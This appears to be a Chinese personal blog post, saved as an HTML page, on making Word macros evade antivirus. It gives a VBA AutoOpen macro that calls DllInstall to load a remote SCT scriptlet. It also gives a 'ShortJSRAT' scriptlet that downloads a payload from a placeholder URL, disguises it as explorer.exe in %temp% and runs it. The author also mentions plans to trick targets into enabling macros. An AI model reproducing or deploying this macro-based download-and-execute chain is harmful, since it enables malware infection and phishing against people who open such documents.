@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>word宏免杀 | Yyx</title>
+<meta name="description" content="记得在这杂乱的生活里，带点微笑">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1629874981011">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://www.yyxyy.xyz/">
+        <img class="avatar" src="https://www.yyxyy.xyz//images/avatar.png?v=1629874981011" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://www.yyxyy.xyz/">
+        <h1 class="site-title">Yyx</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">word宏免杀</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2021-08-25</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://www.yyxyy.xyz/tag/IrCyPWdAK/">
+                    免杀
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <h1 id="写在前面">写在前面</h1>
+<p>仅仅是为了娱乐。</p>
+<h1 id="知识点">知识点</h1>
+<ol>
+<li>宏代码,不执行regsvr32命令 远程调用sct文件,实现免杀</li>
+<li>csharp 可执行js ,反序列化加载</li>
+</ol>
+<p>具体的原理：</p>
+<p>利用宏调用Dlllnstall api</p>
+<pre><code class="language-vbscript">Private Declare PtrSafe Function DllInstall Lib &quot;scrobj.dll&quot; (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
+
+Sub AutoOpen()
+        DllInstall False, ByVal StrPtr(&quot;ip/y.sct&quot;) ' False = &quot;Don't install&quot;
+End Sub
+</code></pre>
+<h1 id="后续操作">后续操作</h1>
+<h2 id="0x01-远程部署一个sct">0x01 远程部署一个sct</h2>
+<p>例如：弹个计算器</p>
+<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+  progid=&quot;TESTING&quot;
+  classid=&quot;{A1112221-0000-0000-3000-000DA00DABFC}&quot; &gt;
+  &lt;script language=&quot;JScript&quot;&gt;
+    &lt;![CDATA[
+var foo = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
+    ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre>
+<p>后续只需要使用word宏远程加载这个sct文件就成。</p>
+<h2 id="0x02-免杀">0x02 免杀</h2>
+<p>操作和前面一样。</p>
+<pre><code class="language-vbscript">&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&quot;ShortJSRAT&quot;
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;!-- Learn from Casey Smith @subTee --&gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+            var WSHShell = new ActiveXObject(&quot;WScript.Shell&quot;);
+            path = WSHShell.ExpandEnvironmentStrings(&quot;%temp%&quot;);
+            var filepath = path+&quot;/explorer.exe&quot;;
+            var xhr = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
+            xhr.open(&quot;GET&quot;,&quot;免杀马&quot;, false);
+            xhr.send();
+            if (xhr.Status == 200) {
+                var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;);
+                var stream = new ActiveXObject(&quot;ADODB.Stream&quot;);
+                stream.Open();
+                stream.Type = 1;
+                stream.Write(xhr.ResponseBody);
+                stream.Position = 0;
+                if (fso.FileExists(filepath)){
+                   fso.DeleteFile(filepath);
+                }
+                stream.SaveToFile(filepath);
+                stream.Close();
+                new ActiveXObject(&quot;WScript.Shell&quot;).Exec(filepath);
+            }
+ 
+ 
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre>
+<h2 id="0x03-对word的一些处理">0x03 对word的一些处理</h2>
+<p>后续会思考如何才能让目标打开宏，怎么样才能更加逼真</p>
+<h1 id="0x04-总结">0x04 总结</h1>
+<p>感谢愿意陪我玩的朋友。</p>
+<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/bapass/1.png" alt="" loading="lazy"></figure>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://www.yyxyy.xyz/post/redis-wei-shou-quan-li-yong-ji-si-kao/">
+              <h3 class="post-title">
+                下一篇：Redis未授权利用及思考
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">记得在这杂乱的生活里，带点微笑</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
